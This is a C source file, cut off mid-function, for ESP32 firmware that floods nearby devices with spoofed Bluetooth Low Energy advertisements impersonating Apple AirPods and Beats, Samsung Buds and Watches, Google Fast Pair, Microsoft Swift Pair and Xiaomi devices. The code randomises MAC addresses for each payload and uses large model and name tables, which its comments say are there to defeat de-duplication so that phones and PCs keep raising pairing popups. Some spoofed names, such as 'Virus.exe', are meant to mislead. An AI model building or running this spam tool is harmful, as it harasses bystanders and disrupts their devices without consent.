#include "ble_spam.h"

#include <string.h>
#include <stdlib.h>
#include <inttypes.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

#include "esp_log.h"
#include "esp_random.h"
#include "esp_timer.h"
#include "esp_bt.h"

#include "host/ble_hs.h"
#include "host/ble_gap.h"
#include "host/util/util.h"
#include "os/os_mbuf.h"

#include "io.h"
#include "ble_scanner.h"
#include "ble_spectrum.h"
#include "wifi_spam.h"
#include "transport_ble.h"

static const char *TAG = "ble_spam";

/* ============================================================
 * Configuration
 * ============================================================ */
#define SPAM_INSTANCE_BASE   1
#define SPAM_INSTANCE        SPAM_INSTANCE_BASE
#define PAD_LEN              31     /* max legacy AD payload */

#define ADV_INTERVAL_MIN     0x20   /* 20 ms = hardware min legacy */
#define ADV_INTERVAL_MAX     0x20

#define DWELL_MS_MIN         20     /* min dwell/rotation — matches Flipper 20ms */
#define DWELL_MS_MAX         1000
#define DWELL_CHUNK_MS       50     /* responsive stop */
#define FAIL_RECOVER_N       3      /* consecutive failures → reconfigure instance */

#define SLOT_MS              2000   /* android/all switching slot */

#if defined(CONFIG_BT_NIMBLE_MAX_EXT_ADV_INSTANCES)
#if (SPAM_INSTANCE_BASE + 1) > CONFIG_BT_NIMBLE_MAX_EXT_ADV_INSTANCES
#error "SPAM_INSTANCE exceeds CONFIG_BT_NIMBLE_MAX_EXT_ADV_INSTANCES"
#endif
#endif

/* ============================================================
 * State
 * ============================================================ */
static SemaphoreHandle_t s_lock = NULL;
static TaskHandle_t      s_task = NULL;
static volatile bool     s_running = false;
static ble_spam_type_t   s_current_type = BLE_SPAM_APPLE_JUICE;
static uint32_t          s_delay_ms = DWELL_MS_MIN;
static uint32_t          s_duration_sec = 0;
static int64_t           s_started_us = 0;
static volatile uint32_t s_cycles_sent = 0;
static uint32_t          s_fail_count = 0;
static uint8_t           s_own_addr_type = BLE_OWN_ADDR_PUBLIC;
static bool              s_addr_ready = false;

/* ============================================================
 * Apple Continuity — color tables & model table
 * ============================================================ */
typedef struct { uint8_t value; const char* name; } ir_color_t;

static const ir_color_t colors_white[] = {{0x00,"White"}};
static const ir_color_t colors_airpods_max[] = {
    {0x00,"White"},{0x02,"Red"},{0x03,"Blue"},{0x0F,"Black"},{0x11,"Light Green"}};
static const ir_color_t colors_beats_flex[] = {{0x00,"White"},{0x01,"Black"}};
static const ir_color_t colors_beats_solo_3[] = {
    {0x00,"White"},{0x01,"Black"},{0x06,"Gray"},{0x07,"Gold/White"},{0x08,"Rose Gold"},
    {0x09,"Black"},{0x0E,"Violet/White"},{0x0F,"Bright Red"},{0x12,"Dark Red"},
    {0x13,"Swamp Green"},{0x14,"Dark Gray"},{0x15,"Dark Blue"},{0x1D,"Rose Gold 2"},
    {0x20,"Blue/Green"},{0x21,"Purple/Orange"},{0x22,"Deep Blue/Light blue"},
    {0x23,"Magenta/Light Fuchsia"},{0x25,"Black/Red"},{0x2A,"Gray/Disney LTD"},
    {0x2E,"Pinkish white"},{0x3D,"Red/Blue"},{0x3E,"Yellow/Blue"},{0x3F,"White/Red"},
    {0x40,"Purple/White"},{0x5B,"Gold"},{0x5C,"Silver"}};
static const ir_color_t colors_powerbeats_3[] = {
    {0x00,"White"},{0x01,"Black"},{0x0B,"Gray/Blue"},{0x0C,"Gray/Red"},
    {0x0D,"Gray/Green"},{0x12,"Red"},{0x13,"Swamp Green"},{0x14,"Gray"},
    {0x15,"Deep Blue"},{0x17,"Dark with Gold Logo"}};
static const ir_color_t colors_powerbeats_pro[] = {
    {0x00,"White"},{0x02,"Yellowish Green"},{0x03,"Blue"},{0x04,"Black"},
    {0x05,"Pink"},{0x06,"Red"},{0x0B,"Gray ?"},{0x0D,"Sky Blue"}};
static const ir_color_t colors_beats_solo_pro[] = {{0x00,"White"},{0x01,"Black"}};
static const ir_color_t colors_beats_studio_buds[] = {
    {0x00,"White"},{0x01,"Black"},{0x02,"Red"},{0x03,"Blue"},{0x04,"Pink"},{0x06,"Silver"}};
static const ir_color_t colors_beats_x[] = {
    {0x00,"White"},{0x01,"Black"},{0x02,"Blue"},{0x05,"Gray"},{0x1D,"Pink"},{0x25,"Dark/Red"}};
static const ir_color_t colors_beats_studio_3[] = {
    {0x00,"White"},{0x01,"Black"},{0x02,"Red"},{0x03,"Blue"},{0x18,"Shadow Gray"},
    {0x19,"Desert Sand"},{0x25,"Black/Red"},{0x26,"Midnight Black"},
    {0x27,"Desert Sand 2"},{0x28,"Gray"},{0x29,"Clear blue/gold"},
    {0x42,"Green Forest camo"},{0x43,"White Camo"}};
static const ir_color_t colors_beats_studio_pro[] = {{0x00,"White"},{0x01,"Black"}};
static const ir_color_t colors_beats_fit_pro[] = {
    {0x00,"White"},{0x01,"Black"},{0x02,"Pink"},{0x03,"Grey/White"},
    {0x04,"Full Pink"},{0x05,"Neon Green"},{0x06,"Night Blue"},
    {0x07,"Light Pink"},{0x08,"Brown"},{0x09,"Dark Brown"}};
static const ir_color_t colors_beats_studio_buds_plus[] = {
    {0x00,"Black"},{0x01,"White"},{0x02,"Transparent"},{0x03,"Silver"},{0x04,"Pink"}};

typedef struct {
    uint16_t value;
    const char* name;
    const ir_color_t* colors;
    const uint8_t colors_count;
} apple_pp_model_t;

static const apple_pp_model_t apple_pp_models[] = {
    {0x0E20,"AirPods Pro",           colors_white,                   1},
    {0x0A20,"AirPods Max",           colors_airpods_max,             5},
    {0x0055,"Airtag",                colors_white,                   1},
    {0x0030,"Hermes Airtag",         colors_white,                   1},
    {0x0220,"AirPods",               colors_white,                   1},
    {0x0F20,"AirPods 2nd Gen",       colors_white,                   1},
    {0x1320,"AirPods 3rd Gen",       colors_white,                   1},
    {0x1420,"AirPods Pro 2nd Gen",   colors_white,                   1},
    {0x1020,"Beats Flex",            colors_beats_flex,              2},
    {0x0620,"Beats Solo 3",          colors_beats_solo_3,            26},
    {0x0320,"Powerbeats 3",          colors_powerbeats_3,            10},
    {0x0B20,"Powerbeats Pro",        colors_powerbeats_pro,          8},
    {0x0C20,"Beats Solo Pro",        colors_beats_solo_pro,          2},
    {0x1120,"Beats Studio Buds",     colors_beats_studio_buds,       6},
    {0x0520,"Beats X",               colors_beats_x,                 6},
    {0x0920,"Beats Studio 3",        colors_beats_studio_3,          13},
    {0x1720,"Beats Studio Pro",      colors_beats_studio_pro,        2},
    {0x1220,"Beats Fit Pro",         colors_beats_fit_pro,           10},
    {0x1620,"Beats Studio Buds+",    colors_beats_studio_buds_plus,  5},
};
#define APPLE_PP_MODELS_N (sizeof(apple_pp_models) / sizeof(apple_pp_models[0]))

static const uint8_t apple_na_actions[] = {
    0x13, 0x24, 0x05, 0x27, 0x20, 0x19, 0x1E,
    0x09, 0x2F, 0x02, 0x0B, 0x01, 0x06, 0x0D, 0x2B,
};
#define APPLE_NA_ACTIONS_N (sizeof(apple_na_actions))

static const uint8_t apple_pp_prefixes[] = { 0x07, 0x01, 0x05 };
#define APPLE_PP_PREFIXES_N (sizeof(apple_pp_prefixes))

/* ============================================================
 * Samsung EasySetup — Buds color table (R,G,B per index).
 * Builder appends the truncated 2nd manufacturer record (10 FF 75) that
 * Android's Galaxy Wearable stack needs to raise the popup. Per-index color
 * variation defeats de-duplication. (Source: tested Flipper reference.)
 * ============================================================ */
typedef struct { uint8_t r, g, b; } samsung_color_t;

static const samsung_color_t SAMSUNG_BUDS_COLORS[] = {
    {0xEE,0x7A,0x0C},{0x9D,0x17,0x00},{0x39,0xEA,0x48},{0xA7,0xC6,0x2C},
    {0x85,0x01,0x16},{0x3D,0x8F,0x41},{0x3B,0x6D,0x02},{0xAE,0x06,0x3C},
    {0xB8,0xB9,0x05},{0xEA,0xAA,0x17},{0xD3,0x07,0x04},{0x9D,0xB0,0x06},
    {0x10,0x1F,0x1A},{0x85,0x96,0x08},{0x8E,0x45,0x03},{0x2C,0x67,0x40},
    {0x3F,0x67,0x18},{0x42,0xC5,0x19},{0xAE,0x07,0x3A},{0x01,0x17,0x16},
    {0x12,0x34,0x56},{0x65,0x43,0x21},{0x78,0x9A,0xBC},{0xDE,0xF1,0x23},
    {0x45,0x67,0x89},{0xAB,0xC1,0x23},{0x32,0x16,0x54},{0x98,0x76,0x54},
    {0x65,0x49,0x87},{0x32,0x19,0x87},
};
#define SAMSUNG_BUDS_N (sizeof(SAMSUNG_BUDS_COLORS) / sizeof(SAMSUNG_BUDS_COLORS[0]))

static const uint8_t SAMSUNG_WATCH_IDS[] = {
    0x1A, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09,
    0x0A, 0x0B, 0x0C, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
    0x18, 0x1B, 0x1C, 0x1D, 0x1E, 0x20, 0x21, 0x22, 0x23, 0x24,
    0x25, 0x26, 0x27, 0x28, 0x29, 0x2A, 0x30, 0x31, 0x32, 0x33,
    0x34, 0x35, 0x40, 0x41, 0x42, 0x60, 0x61, 0x62,
};
#define SAMSUNG_WATCH_N (sizeof(SAMSUNG_WATCH_IDS))

/* ============================================================
 * Google Fast Pair model IDs (3-byte, big-endian when emitted).
 * Large table so Android keeps seeing fresh model IDs instead of
 * de-duplicating after the first few. (Source: tested Flipper reference.)
 * ============================================================ */
static const uint32_t FASTPAIR_MODELS[] = {
    0x72EF8D, 0x0E30C3, 0x00000D, 0x000007, 0x070000, 0x000008, 0x080000,
    0x000009, 0x090000, 0x00000B, 0x0A0000, 0x0B0000, 0x0C0000, 0x060000,
    0x000048, 0x000049, 0x480000, 0x490000, 0x000035, 0x350000, 0x001000,
    0x002000, 0x003000, 0x003001, 0x470000, 0xF00000, 0xF00400, 0x003B41,
    0x003D8A, 0x005BC3, 0x008F7D, 0x00A168, 0x00AA48, 0x00AA91, 0x00B727,
    0x00C95C, 0x00FA72, 0x0100F0, 0x011242, 0x013D8A, 0x01AA91, 0x01C95C,
    0x01E5CE, 0x01EEB4, 0x0200F0, 0x02AA91, 0x02C95C, 0x02D815, 0x02E2A9,
    0x035754, 0x035764, 0x038B91, 0x038F16, 0x039F8F, 0x03AA91, 0x03B716,
    0x03C95C, 0x03C99C, 0x03F5D4, 0x045754, 0x045764, 0x04AA91, 0x04C95C,
    0x050F0C, 0x052CC7, 0x0577B1, 0x057802, 0x0582FD, 0x058D08, 0x05A963,
    0x05A9BC, 0x05AA91, 0x05C95C, 0x06AE20, 0x06C197, 0x06C95C, 0x06D8FC,
    0x0744B6, 0x07A41C, 0x07C95C, 0x07F426, 0xF00200, 0x0102F0, 0xF00201,
    0x0202F0, 0xF00202, 0x0302F0, 0xF00203, 0x0402F0, 0xF00204, 0x0502F0,
    0xF00205, 0x0602F0, 0xF00206, 0x0702F0, 0xF00207, 0x0802F0, 0xF00208,
    0xF00209, 0xF0020A, 0xF0020B, 0xF0020C, 0xF0020D, 0xF0020E, 0xF0020F,
    0xF00210, 0xF00211, 0xF00212, 0xF00213, 0xF00214, 0xF00215, 0x02D886,
    0x02DD4F, 0x02F637, 0x038CC7, 0x04ACFC, 0x04AFB8, 0x054B2D, 0x05C452,
    0x0660D7, 0xF00300, 0x0003F0, 0xF00301, 0x0103F0, 0xF00302, 0x0203F0,
    0xF00303, 0x0303F0, 0xF00304, 0x0403F0, 0xF00305, 0x0503F0, 0xF00306,
    0x0603F0, 0xF00307, 0x0703F0, 0xF00308, 0x0803F0, 0xF00309, 0x0903F0,
    0x7C6CDB, 0x005EF9, 0xE2106F, 0xB37A62, 0xCD8256, 0xF52494, 0x718FA4,
    0x821F66, 0x92BBBD, 0xD446A7, 0x2D7A23, 0x72FB00, 0x00000A, 0x0001F0,
    0x000047, 0x000006, 0x0000F0, 0x0003F0, 0xDAE096, 0xA83C10, 0x9B7339,
    0x202B3D, 0x02D815, 0x1EE890, 0xE6E771, 0xCAB6B8, 0x9C3997, 0x9939BC,
    0xD7102F, 0xCA7030, 0x05AA91, 0x91AA05, 0x03AA91, 0x91AA03, 0x02AA91,
    0x91AA02, 0x038F16, 0x00AA91, 0x91AA00, 0xD6E870, 0x04AA91, 0x91AA04,
    0x01AA91, 0x91AA01, 0x109201, 0xDF271C, 0x532011, 0xDA5200, 0x0052DA,
    0x124366, 0x8D13B9, 0x1F5865, 0x641630, 0x8E5550, 0x21521D, 0xA7E52B,
    0xDF9BA4, 0x5BACD6, 0x8A31B7, 0xDADE43, 0x013D8A, 0x8A3D01, 0x8A3D00,
    0x003D8A, 0xD7E3EB, 0x0F0993, 0x213C8C, 0xDEE8C0, 0x9CE3C7, 0x994374,
    0x0DEC2B, 0xC7A267, 0x5CEE3C, 0x915CFA, 0x89BAD5, 0x8E1996, 0xA8CAAD,
    0x8D16EA, 0x9D7D42, 0xE4E457, 0x99F098, 0x8C4236, 0x9B9872, 0xDAD3A6,
    0x6BA5C3, 0x8C07D2, 0xDA4577, 0x8B0A91, 0xD5A59E, 0x9171BE, 0xC79B91,
    0xE750CE, 0xC8777E, 0xCAF511, 0xA8001A, 0xA7EF76, 0xD933A7, 0xC85D7A,
    0xA8F96D, 0x6C4DE5, 0x8CB05C, 0xC6936A, 0xA8A72A, 0xC7D620, 0xDFD433,
    0xE69877, 0x9B735A, 0xD9414F, 0x664454, 0xA8E353, 0xE09172, 0x0F232A,
    0x5BD6C9, 0x5C0C84, 0x9BC64D, 0x9C98DB, 0xA9394A, 0xA8C636, 0xCC5F29,
    0xD9964B, 0x9C0AF7, 0xC7FBCC, 0xA92498, 0x549547, 0xC9836A, 0xD654CD,
    0x9CF08F, 0x8AADAE, 0x8CAD81, 0x91BD38, 0x9AEEA4, 0xD6C195, 0x9CD0F3,
    0x5C4A7E, 0xDB8AC7, 0x92255E, 0x625740, 0x8E14D7, 0x917E46, 0x861698,
    0x1F181A, 0x9C6BC0, 0xC8162A, 0xE06116, 0xCCBB7E, 0xD8058C, 0x596007,
    0x9A408A, 0xD5B5F7, 0x0DC6BF, 0x855347, 0xA8A00E, 0x6B9304, 0x8BB0A0,
    0x8E4666, 0xE57363, 0x8BF79A, 0xE07634, 0x6B8C65, 0xA8845A, 0x21A04E,
    0x614199, 0x99D7EA, 0xD65F4E, 0xC7736C, 0x0ECE95, 0x8D5B67, 0x8B66AB,
    0x9ADB11, 0xC8E228, 0xD87A3E, 0x567679, 0x284500, 0xE6E8B8, 0x8C6B6A,
    0x8CD10F, 0xD8F4E8, 0xD5C6CE, 0xD6EE84, 0xA8658F, 0x989D0A, 0xE64CC6,
    0x5CC938, 0x5CC939, 0x5CC93A, 0x5CC93B, 0x5CC91E, 0x5CC91F, 0x5CC920,
    0x5CC921, 0x5CC922, 0x5CC923, 0x5CC924, 0x5CC925, 0x5CC926, 0x5CC927,
    0x0DC95C, 0x5CC90A, 0x5CC90B, 0x5CC90C, 0x5CC90D, 0x706908, 0x837980,
    0x5CC932, 0x5CC933, 0x5CC934, 0x5CC935, 0x5CC936, 0x5CC937, 0x5CC928,
    0x5CC929, 0x5CC92A, 0x5CC92B, 0x5CC92C, 0x5CC92D, 0x5CC92E, 0x5CC92F,
    0x5CC930, 0x5CC931, 0x5CC93C, 0x5CC93D, 0x5CC93E, 0x5CC93F, 0x5CC940,
    0x5CC941, 0x5CC942, 0x5CC943, 0x5CC944, 0x5CC945, 0x0EC95C, 0x5CC90E,
    0x5CC90F, 0x5CC910, 0x5CC911, 0x5CC912, 0x5CC913, 0x5CC914, 0x5CC915,
    0x5CC916, 0x5CC917, 0x5CC918, 0x5CC919, 0x5CC91A, 0x5CC91B, 0x5CC91C,
    0x5CC91D, 0xCB529D, 0x9CB881, 0xE020C1, 0xCB2FE7, 0xDEDD6F, 0xDA0F83,
    0xDF4B02, 0x91DABC, 0xE5B91B, 0x20CC2C, 0xC6EC5F, 0x9CEFD1, 0xC878AA,
    0xDEC04C, 0xE57B57, 0xCC93A5, 0xDF01E3, 0xDF42DE, 0x9128CB, 0xDE577F,
    0x6AD226, 0x8B5A7B, 0xD69B2B, 0x6C42C0, 0x997B4A, 0xC6ABEA, 0x5C0206,
    0x9D00A6, 0xCB093B, 0x8A8F23, 0xE5B4B0, 0xDE215D, 0xC69AFD, 0x0E138D,
    0x20A19B, 0x5BA9B5, 0xA88B69, 0x5C7CDC, 0x9CB5F3, 0xD8F3BA, 0x0F2D16,
    0x5C4833, 0x99C87B, 0xDC5249, 0xDEF234, 0x9C888B, 0x9A9BDD, 0xD820EA,
    0x1E955B, 0x9BE931, 0xDEEA86, 0xD90617, 0xC8C641, 0x612907, 0x913B0C,
    0x9DB896, 0x8C1706, 0xE5E2E9, 0x00000C, 0x0577B1, 0x05A9BC, 0xDA9B43,
    0xE6B2D4, 0x9B4B6A, 0xA7C128, 0xB8D241, 0xC9E352, 0xF1A234, 0xD2B345,
};
#define FASTPAIR_MODELS_N (sizeof(FASTPAIR_MODELS) / sizeof(FASTPAIR_MODELS[0]))

/* ============================================================
 * Swift Pair names — normal devices + headphone variant.
 * Larger pool so Windows keeps raising the "Add a device" toast
 * instead of de-duplicating by name. (Source: tested Flipper reference.)
 * ============================================================ */
static const char *SWIFTPAIR_NAMES[] = {
    "Windows Protocol",                     "DLL Missing",
    "Download Windows 12",                  "Microsoft Bluetooth Keyboard",
    "Microsoft Arc Mouse",                  "Microsoft Surface Ergonomic Keyboard",
    "Microsoft Surface Precision Mouse",    "Microsoft Modern Mobile Mouse",
    "Microsoft Surface Mobile Mouse",       "Microsoft Surface Headphones",
    "Microsoft Surface Laptop",             "Microsoft Surface Pro",
    "Microsoft Surface Duo",                "Microsoft Xbox Wireless Controller",
    "Microsoft Surface Earbuds",            "Microsoft Surface Go",
    "Microsoft Surface Studio",             "Microsoft Surface Book",
    "Microsoft Surface Hub",                "Microsoft Surface Pen",
    "Microsoft Surface Dial",               "Microsoft Surface Slim Pen",
    "Microsoft Surface Dock",               "Microsoft Surface Thunderbolt Dock",
    "Microsoft Surface Audio",              "Free VPN",
    "Your Mom's PC",                        "Your Dad's iPhone",
    "404 Device Not Found",                 "Blue Screen of Death",
    "Installing Windows 99...",             "Virus.exe",
    "Trojan Horse",                         "Neighbor's Wi-Fi",
    "Pirated Windows",                      "Keyboard for Cats",
    "Mouse for Dogs",                       "Pizza Delivery Drone",
    "Smart Fridge",                         "Smart Light Bulb",
    "RoboVac 3000",                         "Google Eye",
    "Apple iPot",                           "Samsung Smart Toaster",
    "PlayStation 10",                       "Xbox Infinite",
    "Nintendo Switch Pro Max",              "AI Calculator",
    "Time Travel Watch",                    "Cyber Sock",
    "USB Breadbox",                         "Bluetooth Fork",
    "Wi-Fi Toothbrush",                     "Quantum Toaster",
    "Meme Dispenser",                       "Hello World",
    "Radio C5 Mouse",                       "Radio C5 Keyboard",
};
#define SWIFTPAIR_NAMES_N (sizeof(SWIFTPAIR_NAMES) / sizeof(SWIFTPAIR_NAMES[0]))

static const char *SWIFTPAIR_HP_NAMES[] = {
    "BT Headset",   "Stereo HP",  "Wireless HP", "Audio HP",   "Music HP",
    "Sound HP",     "Bass HP",    "BT Audio",    "BT Stereo",  "Air HP",
    "Mini HP",      "Pro HP",     "Ultra HP",    "Max HP",     "Lite HP",
    "Neo HP",       "Echo HP",    "Pulse HP",    "Wave HP",    "Noise HP",
    "Clear HP",     "Prime HP",   "Core HP",     "Flex HP",    "Zoom HP",
    "Sync HP",      "Nova HP",    "Aura HP",     "Spark HP",   "Radio HP",
};
#define SWIFTPAIR_HP_NAMES_N (sizeof(SWIFTPAIR_HP_NAMES) / sizeof(SWIFTPAIR_HP_NAMES[0]))

/* ============================================================
 * Xiaomi MiBeacon codes
 * ============================================================ */
static const uint16_t XIAOMI_DEVICE_CODES[] = {
    0x01AA, 0x045B, 0x055B, 0x06D3, 0x0387, 0x2832, 0x55B5, 0x0B48, 0x1203,
    0x07F6, 0x0A8D, 0x03DD, 0x3531, 0x2AEB, 0x098B, 0x1889, 0x0098, 0x03BC,
    0x015D, 0x0153, 0x068E, 0x04E6, 0x1568, 0x1569, 0x0DFD, 0x1949, 0x2387,
    0x3A61, 0x0C3C, 0x0576, 0x066F, 0x0347, 0x03D6, 0x0A83, 0x02DF, 0x0997,
    0x1C10, 0x16E4, 0x2542, 0x04E9, 0x00DB, 0x0391, 0x0489, 0x0806, 0x1790,
    0x0863, 0x045C, 0x040A, 0x04E1, 0x098C, 0x0784, 0x0E39, 0x07BF, 0x03BF,
    0x03B6, 0x0083, 0x0113, 0x069E, 0x069F, 0x0380, 0x0DE7, 0x20DB,
};
#define XIAOMI_DEVICE_CODES_N \
    (sizeof(XIAOMI_DEVICE_CODES) / sizeof(XIAOMI_DEVICE_CODES[0]))

/* ============================================================
 * Helpers
 * ============================================================ */
static bool ensure_addr(void)
{
    if (s_addr_ready) return true;
    int rc = ble_hs_util_ensure_addr(0);
    if (rc != 0) { ESP_LOGE(TAG, "ensure_addr rc=%d", rc); return false; }
    rc = ble_hs_id_infer_auto(0, &s_own_addr_type);
    if (rc != 0) { ESP_LOGE(TAG, "infer_auto rc=%d", rc); return false; }
    s_addr_ready = true;
    ESP_LOGI(TAG, "own_addr_type=%u", s_own_addr_type);
    return true;
}

static bool validate_ad(const uint8_t *data, size_t len)
{
    size_t i = 0;
    bool saw_element = false;
    while (i < len) {
        uint8_t l = data[i];
        if (l == 0) break;
        if (i + 1 + l > len) {
            /* Overrun. Tolerated only as a deliberately-truncated trailing
             * record (e.g. Samsung Buds' 10 FF 75) AFTER at least one complete
             * element. A first element that overruns is a real builder bug. */
            return saw_element;
        }
        saw_element = true;
        i += 1 + l;
    }
    return saw_element;
}

static void dump_payload(const char *label, const uint8_t *data, size_t len)
{
    char hex[3 * PAD_LEN + 4];
    static const char hexchars[] = "0123456789ABCDEF";
    size_t i, n = 0;
    if (len > PAD_LEN) len = PAD_LEN;
    for (i = 0; i < len; i++) {
        hex[n++] = hexchars[(data[i] >> 4) & 0xF];
        hex[n++] = hexchars[data[i] & 0xF];
        hex[n++] = ' ';
    }
    hex[n] = 0;
    ESP_LOGI(TAG, "  %s [%u] %s", label, (unsigned)len, hex);
}

/* ============================================================
 * GAP handler — minimal, never terminates a connection
 * ============================================================ */
static int ble_gap_event_handler(struct ble_gap_event *event, void *arg)
{
    (void)arg;
    if (event->type == BLE_GAP_EVENT_CONNECT) {
        /* With ADV_NONCONN_IND this should NEVER fire. If it does, ignore —
         * do NOT terminate. Terminating is what killed Apple popups. */
        ESP_LOGW(TAG, "unexpected CONNECT status=%d", event->connect.status);
    }
    return 0;
}

/* ============================================================
 * transmit_payload — stop / set_addr / set_data / start
 *
 * MAC dirotasi per payload untuk SEMUA tipe (bukan hanya non-FastPair).
 * Ini yang membuat Fast Pair menghasilkan banyak popup, bukan 1-2.
 * ============================================================ */
static int transmit_payload(uint8_t instance, const uint8_t *data, size_t len)
{
    if (len == 0 || len > PAD_LEN) {
        ESP_LOGE(TAG, "payload len=%u out of range", (unsigned)len);
        return BLE_HS_EINVAL;
    }

    /* Stop advertiser. EALREADY / ENOENT are tolerated; anything else means
     * the controller isn't in a good state for set_addr. Bail out. */
    int stop_rc = ble_gap_ext_adv_stop(instance);
    if (stop_rc != 0 &&
        stop_rc != BLE_HS_EALREADY &&
        stop_rc != BLE_HS_ENOENT) {
        ESP_LOGW(TAG, "stop rc=%d", stop_rc);
        return stop_rc;
    }

    /* Fresh static-random MAC (top two bits = 0b11) */
    ble_addr_t addr;
    addr.type = BLE_ADDR_RANDOM;
    for (int i = 0; i < 6; i++) addr.val[i] = (uint8_t)(esp_random() & 0xFF);
    addr.val[5] = (addr.val[5] & 0x3F) | 0xC0;

    int rc = ble_gap_ext_adv_set_addr(instance, &addr);
    if (rc != 0) {
        ESP_LOGW(TAG, "set_addr rc=%d", rc);
        return rc;
    }

    /* Set payload. ble_gap_ext_adv_set_data() frees `om` on both success
     * and error paths (per ESP-IDF NimBLE), so we must not free it here. */
    struct os_mbuf *om = os_msys_get_pkthdr((uint16_t)len, 0);
    if (!om) return BLE_HS_ENOMEM;
    rc = os_mbuf_append(om, data, (uint16_t)len);
    if (rc != 0) { os_mbuf_free_chain(om); return rc; }
    rc = ble_gap_ext_adv_set_data(instance, om);
    if (rc != 0) {
        ESP_LOGW(TAG, "set_data rc=%d len=%u", rc, (unsigned)len);
        return rc;
    }

    /* Start (indefinite duration, unlimited events) */
    rc = ble_gap_ext_adv_start(instance, 0, 0);
    if (rc != 0 && rc != BLE_HS_EALREADY) {
        ESP_LOGW(TAG, "start rc=%d", rc);
        return rc;
    }
    return 0;
}

/* ============================================================
 * Configure — NON-CONNECTABLE, NON-SCANNABLE, legacy PDU
 * ============================================================ */
static int configure_instance(uint8_t instance)
{
    struct ble_gap_ext_adv_params params = {0};
    params.own_addr_type  = BLE_OWN_ADDR_RANDOM;
    params.primary_phy    = BLE_HCI_LE_PHY_1M;
    params.secondary_phy  = BLE_HCI_LE_PHY_1M;
    params.sid            = (uint8_t)(instance & 0x0F);
    params.connectable    = 0;
    params.scannable      = 0;
    params.legacy_pdu     = 1;      /* ADV_NONCONN_IND */
    params.itvl_min       = ADV_INTERVAL_MIN;
    params.itvl_max       = ADV_INTERVAL_MAX;
    params.tx_power       = 0;

    int rc = ble_gap_ext_adv_configure(instance, &params,
                                        NULL, ble_gap_event_handler, NULL);
    if (rc != 0 && rc != BLE_HS_EALREADY) {
        ESP_LOGE(TAG, "ext_adv_configure rc=%d", rc);
        return rc;
    }
    return 0;
}

static void stop_all_instances(void)
{
    ble_gap_ext_adv_stop(SPAM_INSTANCE);
    ble_gap_ext_adv_remove(SPAM_INSTANCE);
}

/* ============================================================
 * Payload builders — verified byte counts
 * ============================================================ */

/* 31 bytes — Apple Proximity Pair */
static size_t build_apple_proximity_pair(uint8_t *out, uint32_t idx)
{
    size_t mi = idx % APPLE_PP_MODELS_N;
    uint16_t model = apple_pp_models[mi].value;
    uint8_t colors_count = apple_pp_models[mi].colors_count;
    uint8_t color = apple_pp_models[mi].colors[esp_random() % colors_count].value;

    uint8_t prefix = (model == 0x0055 || model == 0x0030)
                     ? 0x05
                     : apple_pp_prefixes[esp_random() % APPLE_PP_PREFIXES_N];

    size_t i = 0;
    out[i++] = 30;                             /* AD length = 30 */
    out[i++] = 0xFF;                           /* manufacturer specific */
    out[i++] = 0x4C; out[i++] = 0x00;          /* Apple */
    out[i++] = 0x07;                           /* Proximity Pair */
    out[i++] = 25;                             /* sub-length */
    out[i++] = prefix;
    out[i++] = (model >> 0x08) & 0xFF;
    out[i++] = (model >> 0x00) & 0xFF;
    out[i++] = 0x55;
    out[i++] = (uint8_t)(((esp_random() % 10) << 4) + (esp_random() % 10));
    out[i++] = (uint8_t)(((esp_random() %  8) << 4) + (esp_random() % 10));
    out[i++] = (uint8_t)(esp_random() & 0xFF);
    out[i++] = color;
    out[i++] = 0x00;
    esp_fill_random(&out[i], 16); i += 16;
    return i;  /* 31 */
}

/* 11 bytes — Apple Nearby Action (SourApple) */
static size_t build_apple_nearby_action(uint8_t *out, uint32_t idx)
{
    uint8_t action = apple_na_actions[idx % APPLE_NA_ACTIONS_N];
    uint8_t flags = 0xC0;
    if (action == 0x20 && (esp_random() & 1)) flags--;
    if (action == 0x09 && (esp_random() & 1)) flags = 0x40;

    size_t i = 0;
    out[i++] = 10;                             /* AD length = 10 */
    out[i++] = 0xFF;
    out[i++] = 0x4C; out[i++] = 0x00;
    out[i++] = 0x0F;                           /* Nearby Action */
    out[i++] = 0x05;
    out[i++] = flags;
    out[i++] = action;
    esp_fill_random(&out[i], 3); i += 3;
    return i;  /* 11 */
}

/* 15 bytes — Samsung Galaxy Watch */
static size_t build_samsung_watch(uint8_t *out, uint32_t idx)
{
    uint8_t id = SAMSUNG_WATCH_IDS[idx % SAMSUNG_WATCH_N];
    size_t i = 0;
    out[i++] = 14;
    out[i++] = 0xFF;
    out[i++] = 0x75; out[i++] = 0x00;
    out[i++] = 0x01; out[i++] = 0x00; out[i++] = 0x02; out[i++] = 0x00;
    out[i++] = 0x01; out[i++] = 0x01; out[i++] = 0xFF; out[i++] = 0x00;
    out[i++] = 0x00; out[i++] = 0x43;
    out[i++] = id;
    return i;  /* 15 */
}

/* 31 bytes — Samsung Galaxy Buds.
 * Primary 28-byte Samsung record + a deliberately-truncated 2nd manufacturer
 * record (10 FF 75): the Galaxy Wearable stack needs that trailer to raise the
 * popup, and the per-index R/G/B colour defeats de-duplication. */
static size_t build_samsung_buds(uint8_t *out, uint32_t idx)
{
    const samsung_color_t *c = &SAMSUNG_BUDS_COLORS[idx % SAMSUNG_BUDS_N];
    size_t i = 0;
    out[i++] = 0x1B; out[i++] = 0xFF; out[i++] = 0x75; out[i++] = 0x00;
    out[i++] = 0x42; out[i++] = 0x09; out[i++] = 0x81; out[i++] = 0x02;
    out[i++] = 0x14; out[i++] = 0x15; out[i++] = 0x03; out[i++] = 0x21;
    out[i++] = 0x01; out[i++] = 0x09;
    out[i++] = c->r; out[i++] = c->g; out[i++] = 0x01; out[i++] = c->b;
    out[i++] = 0x06; out[i++] = 0x3C; out[i++] = 0x94; out[i++] = 0x8E;
    out[i++] = 0x00; out[i++] = 0x00; out[i++] = 0x00; out[i++] = 0x00;
    out[i++] = 0xC7; out[i++] = 0x00;
    /* Trailing truncated record (length claims 16, only 2 bytes present) */
    out[i++] = 0x10; out[i++] = 0xFF; out[i++] = 0x75;
    return i;  /* 31 */
}

/* 14 bytes — Google Fast Pair */
static size_t build_fastpair(uint8_t *out, uint32_t idx)
{
    uint32_t model = FASTPAIR_MODELS[idx % FASTPAIR_MODELS_N];

    size_t n = 0;
    out[n++] = 0x03; out[n++] = 0x03; out[n++] = 0x2C; out[n++] = 0xFE;
    out[n++] = 0x06; out[n++] = 0x16; out[n++] = 0x2C; out[n++] = 0xFE;
    out[n++] = (uint8_t)((model >> 16) & 0xFF);
